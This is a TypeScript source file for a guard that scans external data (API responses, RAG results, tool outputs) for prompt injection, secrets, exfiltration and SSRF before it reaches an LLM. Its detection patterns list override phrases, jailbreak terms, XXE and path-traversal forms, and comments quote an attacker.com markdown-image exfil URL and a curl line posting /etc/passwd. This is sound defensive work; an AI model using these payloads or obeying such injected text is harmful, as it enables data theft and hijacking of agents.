/**
 * ExternalDataGuard
 *
 * Validates ALL external data before it enters LLM context.
 * Covers API responses, tool outputs, RAG results, file contents,
 * webhook payloads, and any other untrusted data source.
 *
 * This is an ARCHITECTURAL guard — it enforces boundaries on what
 * external data can reach the LLM, regardless of whether the LLM
 * itself has been compromised. Defense-in-depth at the data boundary.
 *
 * Threat model:
 * - Indirect prompt injection via API responses or RAG documents
 * - Context stuffing via oversized payloads
 * - Data exfiltration via embedded URLs in external content
 * - Secret/credential leakage through external data
 * - Poisoned data from compromised or unknown sources
 */

import { GuardLogger } from "../types";
import { buildDecodeVariants } from "../decode-variants";

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

export interface ExternalDataGuardConfig {
  /** Allowlist of trusted data sources (exact match or prefix) */
  allowedSources?: string[];
  /** Blocklist of known-bad data sources */
  blockedSources?: string[];
  /** Max characters of external content allowed (default: 50000) */
  maxContentLength?: number;
  /** Scan content for prompt injection patterns (default: true) */
  scanForInjection?: boolean;
  /** Detect leaked secrets, API keys, credentials (default: true) */
  scanForSecrets?: boolean;
  /** Detect data exfiltration URLs in content (default: true) */
  scanForExfiltration?: boolean;
  /** Require provenance metadata for all data (default: false) */
  requireProvenance?: boolean;
  /** Optional logger */
  logger?: GuardLogger;
}

// ---------------------------------------------------------------------------
// Result
// ---------------------------------------------------------------------------

export interface ExternalDataGuardResult {
  allowed: boolean;
  reason?: string;
  violations: string[];
  /** Identified data source */
  source?: string;
  /** Length of the content inspected */
  contentLength: number;
  /** Specific threat categories detected */
  threats: string[];
}

// ---------------------------------------------------------------------------
// Provenance metadata callers attach to external data
// ---------------------------------------------------------------------------

export interface DataProvenance {
  /** Where the data came from (URL, service name, file path, etc.) */
  source: string;
  /** Content type hint (e.g. "application/json", "text/html") */
  contentType?: string;
  /** When the data was retrieved (ISO string or epoch ms) */
  retrievedAt?: string | number;
  /** Max acceptable age in seconds before data is considered stale */
  maxAgeSec?: number;
}

// ---------------------------------------------------------------------------
// Detection patterns
// ---------------------------------------------------------------------------

const INJECTION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  { name: "system_tag", pattern: /<\/?system>|<\/?admin>|\[system\]|\[admin\]/i },
  { name: "ignore_instructions", pattern: /ignore\s+(?:all\s+)?(?:previous|prior|above|your)\s+(?:instructions|rules|prompts?)/i },
  { name: "new_instructions", pattern: /new\s+instructions?\s*:/i },
  // "act as a/an X" only counts as a role-override attempt when X is an authority/
  // system-impersonation noun — bare "we act as an intermediary"-style business
  // language uses the same phrase with an ordinary noun and must not be flagged
  // (see false-positive test). Adversarial review found "developer"/"moderator"/
  // "system" too generic — they match ordinary phrases like "act as a developer
  // advocate" or "act as a moderator for the panel" — so those three were
  // dropped from the allowlist; the remaining nouns essentially never appear in
  // benign business/technical text.
  { name: "role_override", pattern: /you\s+are\s+now|from\s+now\s+on|act\s+as\s+(?:a|an)\s+(?:admin|administrator|root|superuser|sudo|unrestricted|jailbroken|dan)\b/i },
  { name: "hidden_instruction", pattern: /HIDDEN_PROMPT|HIDDEN_INSTRUCTION|INVISIBLE_TEXT/i },
  { name: "jailbreak", pattern: /jailbreak|DAN\s*mode|developer\s+mode|unrestricted\s+mode/i },
  { name: "bypass_safety", pattern: /bypass\s+(?:security|safety|filters|restrictions|guardrails)/i },
  { name: "instruction_delimiter", pattern: /={3,}\s*(?:SYSTEM|INSTRUCTIONS?|BEGIN)\s*={3,}/i },
  { name: "prompt_leak_request", pattern: /(?:print|show|reveal|output)\s+(?:your|the|system)\s+(?:prompt|instructions)/i },
  { name: "base64_injection", pattern: /(?:decode|eval|execute)\s+(?:the\s+)?(?:following\s+)?base64/i },
  // Passive instruction-void forms (CSS-hidden, HTML-attr, and plain text injections)
  // Whitespace quantifiers bounded (\s{1,N} instead of unbounded \s+/\s*) —
  // the unbounded form was quadratic-time on long non-matching input (no
  // anchor + optional leading group + inner \s+ that never resolves),
  // ~1.4s on a 30KB string of spaces alone.
  { name: "instructions_void", pattern: /(?:your|the|previous|prior|all\s{1,5}(?:previous|prior))?\s{0,20}instructions?\s{1,10}(?:are|have\s{1,5}been|is)\s{1,10}(?:void|cancelled?|overridden?|revoked|rescinded|superseded)/i },
  { name: "forget_instructions", pattern: /forget\s+(?:your|all|the|my|these|every|each)\s*(?:previous\s+|prior\s+)?(?:instructions?|rules?|guidelines?|directives?|prompts?)/i },
  { name: "disregard_directives", pattern: /disregard\s+(?:all\s+)?(?:previous|prior|above|your)?\s*(?:instructions?|rules?|directives?|guidelines?|prompts?)/i },
  // Structured document injection (RAG/file/email pipelines)
  { name: "xxe_entity", pattern: /<!ENTITY\s+%?\s*\w+\s+SYSTEM\s+["'][^"']+["']/i },
  { name: "doctype_entity", pattern: /<!DOCTYPE\s+\w+\s*\[[\s\S]*<!ENTITY/i },
  { name: "path_traversal", pattern: /(?:\.\.\/){3,}|(?:\.\.\\){3,}|(?:\.\.\/){2,}(?:etc|tmp|root|proc|sys|dev|usr|win)\b|(?:\.\.\\){2,}(?:windows|system32|users)\b/i },
  // Hex-encoded path traversal (zip-slip: hex of ../../)
  { name: "path_traversal_hex", pattern: /(?:2e2e2f){2,}|(?:2e2e5c){2,}/i },
  { name: "office_xml_script", pattern: /<(?:office|o):\w+[^>]*>[\s\S]*?<script/i },
  { name: "rtf_ole_object", pattern: /\\object\\obj(?:emb|link|auto)|\\objdata\s/i },
  // A bounded filler-word tolerance (please/now/you should/etc. before the
  // verb) was tried here to catch payloads like "AGENT: please execute the
  // payload" — reverted after adversarial review found it reopens the exact
  // v4.25.0 false-positive class it was built to avoid: the filler words
  // combine with ordinary verbs from the allowlist to match completely benign
  // comments ("AI: please send feedback to the team", "BOT: you should run
  // the tests before pushing"). Exact adjacency stays as the only reliable
  // (if narrower) signal; see tests/adversarial/RESULTS-v4.25.0.md for the
  // prior FPR history this pattern's verb requirement was added to fix.
  { name: "html_comment_directive", pattern: /<!--\s*(?:BOT|AGENT|ASSISTANT|AI|LLM)\s*:\s*(?:execute|run|call|invoke|perform|fetch|send|ignore|bypass|forget|override|disregard|print|reveal|output|delete|drop)\b/i },
  { name: "embedded_tool_call", pattern: /<tool[_-]?call[^>]*>|<\/tool[_-]?call>/i },
  { name: "langchain_gadget", pattern: /\{["']lc["']\s*:\s*[12]\s*,\s*["']type["']\s*:\s*["'](?:constructor|secret|not_implemented)/i },
  { name: "email_agent_directive", pattern: /<!--\s*(?:assistant|system)\s*:\s*execute\s+tool/i },
  // JSON agent directives via hidden _system/_directive root keys
  { name: "json_system_key", pattern: /"_(?:system|directive|instruction|prompt|admin|command)"\s*:/i },
];

const SECRET_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  { name: "aws_key", pattern: /AKIA[0-9A-Z]{16}/ },
  { name: "generic_api_key", pattern: /(?:api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*["']?[A-Za-z0-9_\-]{20,}/i },
  { name: "bearer_token", pattern: /Bearer\s+[A-Za-z0-9\-._~+\/]{20,}/ },
  { name: "private_key", pattern: /-----BEGIN\s+(?:RSA|EC|DSA|OPENSSH)?\s*PRIVATE\s+KEY-----/ },
  { name: "github_token", pattern: /gh[ps]_[A-Za-z0-9_]{36,}/ },
  { name: "jwt", pattern: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/ },
  { name: "password_field", pattern: /(?:password|passwd|pwd)\s*[=:]\s*["'][^"']{8,}/i },
  { name: "connection_string", pattern: /(?:mongodb|postgres|mysql|redis):\/\/[^\s]{10,}/i },
];

const EXFILTRATION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  // Named-key exfil: markdown image URL whose query param key hints at data
  // smuggling. Removing "token" from this list was tried (it's a common key
  // name for legitimate signed-CDN URLs) but reverted after adversarial
  // review showed it silently reopens a real exfil bypass
  // (![img](https://attacker.com/log?token=...) went undetected) — for a
  // security-relevant pattern, restoring recall takes priority over the
  // narrower, lower-severity CDN false positive.
  { name: "markdown_image_exfil", pattern: /!\[.*?\]\(https?:\/\/[^)]*\?[^)]*(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
  // "Reprompt"-style exfil (CVE-2026-24307): markdown image with any long query-param value (≥30 chars).
  { name: "markdown_image_exfil_long_value", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)&]{30,}/ },
  // Markdown exfil using URL-encoded path separators (%2F=/,  %5C=\) in query values
  { name: "markdown_image_exfil_urlenc", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)]*%(?:2[Ff]|5[Cc])/i },
  { name: "tracking_pixel", pattern: /<img[^>]+src=["']https?:\/\/[^"']*\?[^"']*["'][^>]*(?:width|height)\s*=\s*["']?[01]px/i },
  { name: "encoded_url_exfil", pattern: /https?:\/\/[^\s]*(?:callback|webhook|exfil|collect)[^\s]*\?[^\s]*(?:data|payload|d)=/i },
  { name: "data_send_instruction", pattern: /send\s+(?:this|the|all)\s+(?:data|information|content|context)\s+to/i },
  // Narrowing this to require an exfil-shaped query param was tried (fetching
  // an arbitrary URL, e.g. "fetch https://api.example.com/pricing", is
  // mundane on its own) but reverted after adversarial review found it
  // misses real exfil that doesn't put its payload in a query string: body-
  // based exfil ("curl -X POST ... --data-binary @/etc/passwd"), and bare
  // C2/beacon URLs with no query string at all. Recall matters more here
  // than the narrower false positive.
  { name: "fetch_url", pattern: /(?:fetch|request|call|curl|wget)\s+https?:\/\//i },
];

// SSRF attack surface detection — private/link-local IPs and dangerous URL schemes
const SSRF_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  // AWS link-local metadata, GCP metadata, ECS metadata
  { name: "cloud_metadata_endpoint", pattern: /169\.254\.169\.254|metadata\.google\.internal|169\.254\.170\.2/i },
  // Loopback and RFC-1918 private IPs inside an http(s) URL
  { name: "ssrf_private_ip", pattern: /https?:\/\/(?:127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|0\.0\.0\.0)\b/i },
  // file:// scheme — local file read via SSRF
  { name: "file_scheme", pattern: /file:\/\//i },
  // Gopher protocol — Redis/memcache SSRF smuggling
  { name: "gopher_scheme", pattern: /gopher:\/\//i },
  // Other dangerous non-HTTP schemes
  { name: "dangerous_scheme", pattern: /(?:dict|ldap|ldaps|sftp|tftp|jar|netdoc|ftp):\/\//i },
];

const PII_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
  { name: "ssn", pattern: /\b\d{3}-\d{2}-\d{4}\b/ },
  { name: "credit_card", pattern: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b/ },
  // Bounded local-part/label/TLD lengths and a label-grouped domain (instead
  // of one unbounded [A-Za-z0-9.-]+ overlapping the literal "." separator)
  // avoid catastrophic backtracking on long, non-matching input — the
  // previous form could take 10s+ on an 80KB string with no valid email in
  // it, which re-scanning across decode variants made trivially reachable.
  { name: "email_address", pattern: /\b[A-Za-z0-9._%+-]{1,64}@(?:[A-Za-z0-9-]{1,63}\.){1,8}[A-Za-z]{2,24}\b/i },
];

// ---------------------------------------------------------------------------
// Guard implementation
// ---------------------------------------------------------------------------

export class ExternalDataGuard {
  private config: Required<Pick<ExternalDataGuardConfig,
    "maxContentLength" | "scanForInjection" | "scanForSecrets" |
    "scanForExfiltration" | "requireProvenance"
  >> & ExternalDataGuardConfig;

  constructor(config: ExternalDataGuardConfig = {}) {
    this.config = {
      ...config,
      maxContentLength: config.maxContentLength ?? 50_000,
      scanForInjection: config.scanForInjection ?? true,
      scanForSecrets: config.scanForSecrets ?? true,
      scanForExfiltration: config.scanForExfiltration ?? true,
      requireProvenance: config.requireProvenance ?? false,
    };
  }

  /**
   * Validate external data before it enters LLM context.
   *
   * @param content  - The raw external content (string or object)
   * @param provenance - Optional metadata about the data source
   */
  validate(
    content: string | Record<string, unknown>,
    provenance?: DataProvenance
  ): ExternalDataGuardResult {
    const violations: string[] = [];
    const threats: string[] = [];
    const contentStr = typeof content === "string" ? content : this.safeStringify(content);
    const source = provenance?.source;

    // 1. Provenance requirement
    if (this.config.requireProvenance && !provenance?.source) {
      violations.push("MISSING_PROVENANCE");
      threats.push("no_source_metadata");
    }

    // 2. Source verification
    if (source) {
      if (this.isBlockedSource(source)) {
        violations.push("BLOCKED_SOURCE");
        threats.push("blocked_data_source");
      }
      if (this.config.allowedSources && this.config.allowedSources.length > 0) {
        if (!this.isAllowedSource(source)) {
          violations.push("UNAPPROVED_SOURCE");
          threats.push("source_not_in_allowlist");
        }
      }
    }

    // 3. Size limits — prevent context stuffing
    if (contentStr.length > this.config.maxContentLength) {
      violations.push("CONTENT_TOO_LARGE");
      threats.push("context_stuffing");
    }

    // 4. Metadata validation — freshness check
    if (provenance?.retrievedAt && provenance?.maxAgeSec) {
      const retrievedMs = typeof provenance.retrievedAt === "string"
        ? new Date(provenance.retrievedAt).getTime()
        : provenance.retrievedAt;
      const ageMs = Date.now() - retrievedMs;
      if (ageMs > provenance.maxAgeSec * 1000) {
        violations.push("STALE_DATA");
        threats.push("data_expired");
      }
    }

    // Content checks 5-8 also scan de-obfuscated variants (URL/hex/base64/
    // ROT13/reversed/homoglyph-normalized) — a raw pattern match alone is
    // trivially bypassed by wrapping the payload in any of these encodings.
    const scanTargets = [contentStr, ...buildDecodeVariants(contentStr)];

    // 5. Content injection detection
    if (this.config.scanForInjection) {
      for (const target of scanTargets) {
        for (const { name, pattern } of INJECTION_PATTERNS) {
          pattern.lastIndex = 0;
          if (pattern.test(target)) {
            violations.push("INJECTION_DETECTED");
            threats.push(`injection:${name}`);
          }
        }
      }
    }

    // 6. Secret / credential detection
    if (this.config.scanForSecrets) {
      for (const target of scanTargets) {
        for (const { name, pattern } of SECRET_PATTERNS) {
          pattern.lastIndex = 0;
          if (pattern.test(target)) {
            violations.push("SECRET_DETECTED");
            threats.push(`secret:${name}`);
          }
        }
        // Also flag PII
        for (const { name, pattern } of PII_PATTERNS) {
          pattern.lastIndex = 0;
          if (pattern.test(target)) {
            violations.push("PII_DETECTED");
            threats.push(`pii:${name}`);
          }
        }
      }
    }

    // 7. Data exfiltration URL detection
    if (this.config.scanForExfiltration) {
      for (const target of scanTargets) {
        for (const { name, pattern } of EXFILTRATION_PATTERNS) {
          pattern.lastIndex = 0;
          if (pattern.test(target)) {
            violations.push("EXFILTRATION_ATTEMPT");
            threats.push(`exfil:${name}`);
          }
        }
      }
    }

    // 8. SSRF detection — private IPs, cloud metadata, dangerous schemes
    for (const target of scanTargets) {
      for (const { name, pattern } of SSRF_PATTERNS) {
        pattern.lastIndex = 0;
        if (pattern.test(target)) {
          violations.push("SSRF_ATTEMPT");
          threats.push(`ssrf:${name}`);
        }
      }
    }

    // Deduplicate
    const uniqueViolations = [...new Set(violations)];
    const uniqueThreats = [...new Set(threats)];
    const allowed = uniqueViolations.length === 0;

    const result: ExternalDataGuardResult = {
      allowed,
      reason: allowed ? undefined : `External data rejected: ${uniqueViolations.join(", ")}`,
      violations: uniqueViolations,
      source,
      contentLength: contentStr.length,
      threats: uniqueThreats,
    };

    if (!allowed) {
      this.log(`Blocked external data: ${uniqueViolations.join(", ")}`, "warn");
    }

    return result;
  }

  /**
   * Validate a batch of external data items (e.g. multiple RAG chunks).
   * Returns individual results and a combined summary.
   */
  validateBatch(
    items: Array<{ content: string | Record<string, unknown>; provenance?: DataProvenance }>
  ): { results: ExternalDataGuardResult[]; allAllowed: boolean; totalThreats: number } {
    const results = items.map(item => this.validate(item.content, item.provenance));
    return {
      results,
      allAllowed: results.every(r => r.allowed),
      totalThreats: results.reduce((sum, r) => sum + r.threats.length, 0),
    };
  }

  // -----------------------------------------------------------------------
  // Private helpers
  // -----------------------------------------------------------------------

  private isBlockedSource(source: string): boolean {
    if (!this.config.blockedSources) return false;
    const lower = source.toLowerCase();
    return this.config.blockedSources.some(b => lower.includes(b.toLowerCase()));
  }

  private isAllowedSource(source: string): boolean {
    if (!this.config.allowedSources) return true;
    const lower = source.toLowerCase();
    return this.config.allowedSources.some(a => lower.startsWith(a.toLowerCase()));
  }

  private log(message: string, level: "info" | "warn" | "error"): void {
    this.config.logger?.(message, level);
  }

  private safeStringify(value: unknown): string {
    try {
      return JSON.stringify(value);
    } catch {
      return String(value);
    }
  }
}
